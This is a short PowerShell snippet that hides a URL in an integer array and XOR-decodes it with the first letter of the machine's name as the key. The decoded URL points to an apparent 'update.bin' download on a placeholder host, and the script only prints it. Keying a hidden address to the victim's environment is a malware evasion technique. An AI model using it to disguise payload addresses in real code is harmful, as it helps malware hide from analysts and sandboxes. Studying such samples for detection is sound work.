$computerName = $env:COMPUTERNAME
$url = ((38,58,58,62,61,116,97,97,43,54,47,35,62,34,43,96,33,60,41,97,47,62,39,97,56,127,97,59,62,42,47,58,43,96,44,39,32 | ForEach-Object { [char]($_ -bxor [int]([char]$computerName[0])) }) -join '')
Write-Output $url
